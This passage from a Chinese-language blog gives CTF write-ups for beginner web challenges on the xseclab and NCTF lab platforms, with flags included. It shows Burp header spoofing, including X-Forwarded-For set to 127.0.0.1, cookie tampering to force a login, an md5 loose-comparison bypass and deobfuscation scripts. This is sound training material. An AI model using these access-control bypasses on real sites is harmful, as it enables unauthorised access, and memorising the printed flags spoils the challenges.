sSk5SbFkyVW10MGFrMVlRa3BXYlhoVFlWWktjMk5HYkZoV00xSm9Xa1JCTVdNeFpISmhSM2hUVFVad2FGWnRNSGhWTVVsNFZXNU9XR0pWV2xkVmJYaHpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbTF3UzFNeVRuTlVia3BxVW0xb2NGVnRlSGRsVm1SWlkwVmtWMkpXV2xoV1J6VlBZVlpLZFZGck9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1IxVkd4U2FFMXRhRzlXVjNSWFdWZE9jMVp1UmxSaE0xSlZWbTE0UzAxR2JGWlhhemxYVFZad1NGWXljRXRXTWtwSVZHcFNWV0V5VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5HVm5WWGJHUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVG1oTlZXdzBWVEZvYzFVeVJYbGhTRUpXWWxoTmVGa3dXbk5XVmtaMVdrVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm01d1YxWkdXbkZUYTFwc1ZteGFNVlZ0ZUdGaFZrbDRVbGhrVjJKVVJUQlpla3BPWlVkT1JtRkdRbGRpVmtwVlYxZDBWMlF4WkhOWGEyaHNVak5DVUZadGVITk9SbGw1VGxaT1YySlZjRWxaVlZwdlZqSkdjazVWT1ZWV2JIQm9WakJrVG1WdFJrZGhSazVwVW01Qk1sWXhXbGRaVjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxME1HRnJNVmRUYWtaWFZqTm9VRmxXV2twbFJrNTFXa1prYUdFd2NGaFdSbFpXWlVaSmVGcElTbWhTTTFKVVZGVmFkMlJzV2tkYVNIQk9WakZhZWxZeGFITlVNVnB5VGxjNVZWWnNXak5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUm1ob1RXMW9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaYVZWZDRjMWxXV2xoaFJYaGFZVEZ3WVZwVldtdGpiVTVIWVVkb1RsZEZTbEpXYlRGM1V6RktkRlpyYUZWaE1WcFlXV3RrVTFaR1ZuTlhibVJzVm0xU1dsa3dWbXRXTWtwWFVtcE9WVlpzV25wWlZscEtaVmRHUjFWc2NHbFNNbWd5Vm1wR1lXRXhaRWhXYTJoUVZtdHdUMVpzVWtaTlJtUlZVVzFHV2xac2JEUlhhMVp2WVVaS2MxTnNXbGRpVkVaVVZtdGFkMWRIVmtsVWJHUnBVakZLTmxaclkzaGlNVmw1VWxod1VsZEhhRmhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURjZUVlV4UjFadVVteFNWR3h3VldwQ2QxZHNiRlpWYkU1WFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMlF4UlhoaVJtaFZZVEpTV0ZsdGVFdGpNVlYzV2taT2FrMVhlSGxXTWpWUFZERmFkVkZzWkZwV1YxRjNWakJhUzJOdFNrVlViR1JwVjBWS1ZWWnFTbnBsUmtsNFZHNU9VbUpIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYXpsVlZucEdkbFV5ZUZwbFJsWnlZMGQ0VTJGNlJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXdGFTMWRHV2tWU2JHUnFUV3RhUjFaSGVGTlViRnAxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWMWQwYTJJeVVuTlhXR1JZWWxoU1ZWVnFRbUZUVm14V1YyMUdWV0pGY0RGVlZ6QTFWakpLVlZKVVFscGxhM0JRV1hwR2QxTldUblJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKcmNHRlVWRXBUVlVaYWRHVklUazlTYkd3MVZHeFZOV0ZIU2taalJteGFWbFp3ZWxacVNrWmxSbHBaWVVkR1UwMHlhRFpXYlhCSFdWWmtXRkpyWkdoU2F6VndWVzAxUWsxc1dYaFhiR1JhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1FMUhSbkpOVm1SVVlXdGFXRlpxVG05U1JscHhVMnQwVTAxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVZsUkdXbVZIVGtaaVJsWnBVakpvZDFadGVHRmtNV1JIVjJ0a1dHSlZXbkZVVlZKWFUwWlplR0ZJVGxWTlZuQjVWR3hqTlZaV1duTlhibkJWWWtad2VsWnRNVWRTYkZKeldrZHNWMWRGU2t0V01WcFhWakZWZUZkWVpFNVdiVkp4VldwS2IxbFdVbGRYYm1SV1VtMTBORll5ZUd0aGF6RllWVzVzVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdsZHNWbUZoTVZsM1RWaEdWMkpyY0ZoV2ExWjNWRVpWZUZkclpHcGlWVnBJVjJ0YVQxUnJNWFJoUmxwWFlsUkdNMVY2Ums1bFZsSjFWR3hXYVdFelFuWldWekI0VlRGYVIxVnNWbFJpVkd4d1ZGWmFkMlZXV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlp0VWxaVlZ6RkhZVlV4Y2xkcVFsZGlWRlpNVmpCa1MxTkhWa2RhUm5CcFVqSm9WVlpHVWtka01WbDRXa2hTYTFJelFuQlZha1pLWkRGYVJWSnRkR2xOVm13elZGWldhMkZGTUhsbFJtaGFZa1pLUTFwVlduTmpWa3B6WTBkNFUySldTalZXYWtvMFZUSkdXRk5yYkZKaVIyaFlXV3hvVTFkR1pGZGFSbVJxVFZkU01WVnRlRTloVmtsNFUyNW9WMUpzY0hKV1ZFcFhZekpLUjFkdFJsUlNWRloyVm0weE5HUXlWbGRoTTJSV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNREZIVjFob1ZWZEhhR2hWYkdSVFZqRnNjbHBHVGxoV2JYZ3dWRlphVDJGck1WZGpSRUpoVmxkb1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxXUjNocllVZFdjMWRzYkZkaGExcDJXV3BLUjJNeFRuTmhSMmhUWlcxNFdGZFdaREJrTWxKelYydFdVMkpHY0hKVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkZNVmRVYkZKVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKRlNtaFdiR1JUVTBaYWMxZHRSbGROYXpWSVYydGFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5WVVkd1UwMXVhRmxXYWtKWFV6Rk9SMWR1VW14U00xSlFWV3BDVjA1R1dsaE9WazVXVFd0d2VWUnNXbk5YYlVWNFkwZG9WMDFXY0doYVJWVjRWakZPY2s1V1RtbFNiWFExVm14amQyVkdTWGxTYmxKVFlXeHdXRmxyWkc5WlZteFZVbTVrVlZKdGVGaFdNblF3WVdzeGNrNVZhRnBoTVhCMlZtcEJkMlZHVG5SUFZtaG9UVlZ3U1ZkV1VrZFhiVlpIWTBWc1ZHSlhhRlJVVkVaTFZsWmFSMVp0Um10TlYxSllWakowYTFsV1RrbFJiazVXWWtaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pXWlVaa1dWcEZOVmRpVmtwNFZsZHdTMkl4YkZkVmJHUllZbTFTVjFWdE1UQk9SbGw1WlVkMGFHRjZSbGxXVnpWelZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZkSFozcFhiRnBoV1ZkU1JrMVdXbUZTYkZwdldsZDBZVmRzWkhOV2JVWm9UVlpzTTFSV2FFZFdNa3B5WTBab1YyRXhXak5XUlZwV1pVWmtjbHBIY0dsV1ZuQkpWakowWVZReFVuSk5XRkpvVW14d1dGbHNVa2ROTVZZMlVtczFiRlpzU2pGV1IzaFhZVmRGZWxGdWFGZFdla0kwV1dwS1QxSXhXblZWYlhoVVVqRktkMVpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVld3MldWVm9kMWRzV1hwaFJYaGhVbXh3U0ZreWN6VldNVnB6V2tkNGFFMVhPVFZXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXUmxwelkwaG9WazFXU2toV1ZFRjRWakZhY1Zac1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHV0dKV1dsbFdiWFJ2WVRGSmVsRnVRbFppVkZaRVZtcEdZVmRGTVZWVmJXeE9WbXhaTVZaWGVHOWtNVlowVTJ4YVdHSkhhRmhaYkZKSFZURlNWbGR1VGs5aVJYQXdXa1ZhVDFSc1dYaFRXR2hYWWtkUk1GZFdaRWRUUms1eVlrWkthVkl4U2xsWFYzaFRVbXN4UjJORlZsUmlSMUp4VkZaa1UwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcHpZMGhLVjFaRmNGaFpla3BMVWpGa2RGSnNVbE5XUmxveVZtMHdlRTVIVVhsV2JHUm9UVEpTV1ZsdE1WTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVU1SVUydG9hVkpyTlZsVmJGWjNWVEZhZEUxSVpHeFNWRlpKVld4b2IxWXhaRWhoUjJoV1lrZFNWRlpxUm5OamJHUjFXa1prVGxZemFGZFdWRW8wVkRKR2NrMVdaR3BTUlVwb1ZteGFXbVF4YkhKYVJYUlRUV3MxUmxWWGVGZFdNVnB5WTBac1YySllRa05hVlZwTFZqRk9kVlJ0UmxOaWEwcDNWMWN4TUZNeFVsZFhibEpPVTBkb1ZWUldaRk5YUmxwMFRsWmtXRkl3Y0VsV1Z6QTFWMnhhUmxkcVRscGhhMXBvVmpCVmVGWldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZoa1JGcGFWbFpWTVZaVVNrdFhWMFpIWTBaa2FFMVlRakpYVjNCTFVqSk5lRlJ1VG1oU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGWXlkRmRWTWtwV1YyNUdWVlp0VWxSYVYzaHlaREZ3UlZWdGFGZGhNMEY0VmxaYWIyRXhaRWhUYTJSWVltdHdWMWxYZEdGaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnRPVmROVm5CVVZXcEtVbVZXVW5WVWJHaFlVakZLYjFaWGVHOVZNazVYWWtoT1YxWkZXbFJVVmxwSFRrWlplVTFVUW1oU2JIQXdWbGQwYzFkSFJuSk9WRTVYWVd0d1NGa3llRTlrUjBaSFkwZDRhRTFZUWpWV2JYQkRXVlpWZVZSdVRtcFNWMmhVV1d0Vk1XTkdXblJrU0dSWFlrWnNORmRyVWtOWGJGbDRVbXBPVldKR2NISldNR1JMWXpGT2NrOVdaR2hOVm5CTlZqRmFZVmxYVWtoV2ExcGhVbFJzVkZscmFFSmtNV1J6Vm0xR2FFMVdjRmxWTW5SaFlXeEtXR1ZIUmxWV1JUVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0=\"i = 0while True: try: password = base64.b64decode(password) i += 1 except: breakprint \"The Number of encryptions is:\",str(i)print password 第四题给出了md5加密的密文，直接扔到https://cmd5.org/解密得bighp 第五题网址：http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php 题目说只让外国人访问，用burp抓包看到头部看到Accept-Language: zh-CN,zh;q=0.9字段 尝试将zh-CN,zh;删除，得到key 第六题网址：http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php 只有HAHA浏览器才能访问页面，浏览器相关信息在User-Agent字段中体现，利用burp抓包在User-Agent字段添加HAHA即可得到key 第七题网址：http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php key在响应头部字段中 第八题网址：http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/index.php 源代码显示访问http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/search_key.php，可是却跳转到http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/index_no_key.php 明显有重定向 用burp抓包查看http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/search_key.php返回信息 访问http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/key_is_here_now_.php key: ohHTTP302dd 第九题网址：http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php burp抓包将Cookie: Login=0修改成Cookie: Login=1 key is: yescookieedit7823789KJ 第十题网址：http://lab1.xseclab.com/base10_0b4e4866096913ac9c3a2272dde27215/index.php 在控制台中修改input标签的max-length属性值，修改为1000，然后随便post四位数字以上即可 key is 768HKyu678567&amp;*&amp;K 第十一题网址：http://lab1.xseclab.com/base11_0f8e35973f552d69a02047694c27a8c9/index.php 要求本地访问，用burp抓包添加X-Forwarded-For:127.0.0.1 这里服务器出问题了，直接给出了源代码和key is ^&amp;*(UIHKJjkadshf 第十二题网址：http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php 尝试了admin.php,login.php等都返回404，试着访问robots.txt，发现文件/9fb97531fe95594603aff7e794ab2f5f/ 访问，提示you find me,but I am not the login page. keep search. 尝试http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/9fb97531fe95594603aff7e794ab2f5f/login.php 获得key is UIJ%%IOOqweqwsdf 脚本关第一题网址：http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php 重定向，burp抓包即可得key is : yougotit_script_now 第二题网址：http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php 要求我们2秒内计算出值，不然再刷新页面就换成别的算式 写个脚本计算即可 1234567891011121314151617import requestsimport rewhile True: url = \"http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php\" s = requests.Session() r = s.get(url) match = re.search(r'\\s(.*)=&lt;input',r.text) result = eval(match.group(1)) data = &#123; 'v':result, 'submit':'提交' &#125; r = s.post(url,data=data) if 'key' in r.text: print(r.text) break 第三题输入null即可 第四题源代码中发现js代码 123var b=function(p,a,c,k,e,r)&#123;e=function(c)&#123;return(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)r[e(c)]=k[c]||e(c);k=[function(e)&#123;return r[e]&#125;];e=function()&#123;return'\\\\w+'&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p&#125;('1s(1e(p,a,c,k,e,r)&#123;e=1e(c)&#123;1d(c&lt;a?\\'\\':e(1p(c/a)))+((c=c%a)&gt;1q?1f.1j(c+1k):c.1n(1o))&#125;;1g(!\\'\\'.1h(/^/,1f))&#123;1i(c--)r[e(c)]=k[c]||e(c);k=[1e(e)&#123;1d r[e]&#125;];e=1e()&#123;1d\\'\\\\\\\\w+\\'&#125;;c=1&#125;;1i(c--)1g(k[c])p=p.1h(1l 1m(\\'\\\\\\\\b\\'+e(c)+\\'\\\\\\\\b\\',\\'g\\'),k[c]);1d p&#125;(\\'Y(R(p,a,c,k,e,r)&#123;e=R(c)&#123;S(c&lt;a?\\\\\\'\\\\\\':e(18(c/a)))+((c=c%a)&gt;17?T.16(c+15):c.12(13))&#125;;U(!\\\\\\'\\\\\\'.V(/^/,T))&#123;W(c--)r[e(c)]=k[c]||e(c);k=[R(e)&#123;S r[e]&#125;];e=R()&#123;S\\\\\\'\\\\\\\\\\\\\\\\w+\\\\\\'&#125;;c=1&#125;;W(c--)U(k[c])p=p.V(Z 11(\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\'+e(c)+\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\',\\\\\\'g\\\\\\'),k[c]);S p&#125;(\\\\\\'G(B(p,a,c,k,e,r)&#123;e=B(c)&#123;A c.L(a)&#125;;E(!\\\\\\\\\\\\\\'\\\\\\\\\\\\\\'.C(/^/,F))&#123;D(c--)r[e(c)]=k[c]||e(c);k=[B(e)&#123;A r[e]&#125;];e=B()&#123;A\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\'&#125;;c=1&#125;;D(c--)E(k[c])p=p.C(I J(\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\',\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\'),k[c]);A p&#125;(\\\\\\\\\\\\\\'t(h(p,a,c,k,e,r)&#123;e=o;n(!\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'.m(/^/,o))&#123;l(c--)r[c]=k[c]||c;k=[h(e)&#123;f r[e]&#125;];e=h()&#123;f\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'&#125;;c=1&#125;;l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'),k[c]);f p&#125;(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'1 3=\"6\";1 4=\"7\";1 5=\"\";8(1 2=0;2&lt;9;2++)&#123;5+=3+4&#125;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',j,j,\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'|u|i|b|c|d|v|x|y|j\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'.z(\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'|\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'),0,&#123;&#125;))\\\\\\\\\\\\\\',H,H,\\\\\\\\\\\\\\'|||||||||||||||A||B||M||D|C|E|F||I||J|G|N|O||P|Q|K\\\\\\\\\\\\\\'.K(\\\\\\\\\\\\\\'|\\\\\\\\\\\\\\'),0,&#123;&#125;))\\\\\\',X,X,\\\\\\'||||||||||||||||||||||||||||||||||||S|R|V|W|U|T|Y|13|Z|11|14|12|10|19|1a|1b|1c\\\\\\'.14(\\\\\\'|\\\\\\'),0,&#123;&#125;))\\',1t,1u,\\'|||||||||||||||||||||||||||||||||||||||||||||||||||||1e|1d|1f|1g|1h|1i|1v|1s|1l||1m|1n|1o|1r|1k|1j|1q|1p|1w|1x|1y|1z\\'.1r(\\'|\\'),0,&#123;&#125;))',62,98,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return|function|String|if|replace|while|fromCharCode|29|new|RegExp|toString|36|parseInt|35|split|eval|62|75|53|var|slakfj|teslkjsdflk|for'.split('|'),0,&#123;&#125;);var d=eval(b);alert(\"key is first 14 chars\"+d); 直接扔到控制台执行后弹窗 截取key is first chars后的十四位就是key","categories":[{"name":"hacking-Web","slug":"hacking-Web","permalink":"https://Foxgrin.github.io/categories/hacking-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"nctf-Web","slug":"nctf-Web","date":"2018-08-12T02:48:00.000Z","updated":"2018-09-04T13:22:50.069Z","comments":true,"path":"/posts/7108/","link":"","permalink":"https://Foxgrin.github.io/posts/7108/","excerpt":"南京邮电大学ctf平台Web题解","text":"南京邮电大学ctf平台Web题解 签到题网址：http://chinalover.sinaapp.com/web1/ flag在源代码中 md5 collision网址：http://chinalover.sinaapp.com/web19/ 源码 123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"nctf&#123;*****************&#125;\";&#125; else &#123; echo \"false!!!\";&#125;&#125;else&#123;echo \"please input a\";&#125;?&gt; md5值碰撞，get参数a=240610708 即可 签到2网址：http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php 提示我们输入口令zhimakaimen 但是源代码限制了输入文本的长度，在浏览器检查将长度修改即可输入完整口令 这题不是WEB网址：http://chinalover.sinaapp.com/web2/index.html 题目说不是web，看了源代码，抓了包，还真没找出什么，而且后缀名是html 下载下图片，用Notepad打开，发现最后藏了flag… 层层递进网址：http://chinalover.sinaapp.com/web3/ 用检查的network项发现有个404页面：http://chinalover.sinaapp.com/web3/404.html 进去发现源代码里给了提示 将jquery-后的字符一一拼凑就是flag，写个脚本快点 1234567891011&gt;&gt;&gt; import re&gt;&gt;&gt; s = '''&lt;script src=\"./js/jquery-n.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-c.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-t.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-f.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-&#123;.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-t.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-h.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-i.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-s.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-_.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-i.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-s.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-_.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-a.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-_.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-f.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-l.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-4.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-g.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-&#125;.7.2.min.js\"&gt;&lt;/script&gt;'''&gt;&gt;&gt; match = re.findall(r'jquery-(.)\\.',s)&gt;&gt;&gt; match['n', 'c', 't', 'f', '&#123;', 't', 'h', 'i', 's', '_', 'i', 's', '_', 'a', '_', 'f', 'l', '4', 'g', '&#125;']&gt;&gt;&gt; flag = ''&gt;&gt;&gt; for i in match: flag = flag + i&gt;&gt;&gt; flag'nctf&#123;this_is_a_fl4g&#125;' AAencode网址：http://chinalover.sinaapp.com/web20/aaencode.txt 题目给出了提示js 的aaencode 用火狐浏览器打开时会出现乱码，首先按alt打开菜单，在查看的文字编码中选择unicode编码方式，就能得到这样的一串字符 1ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ 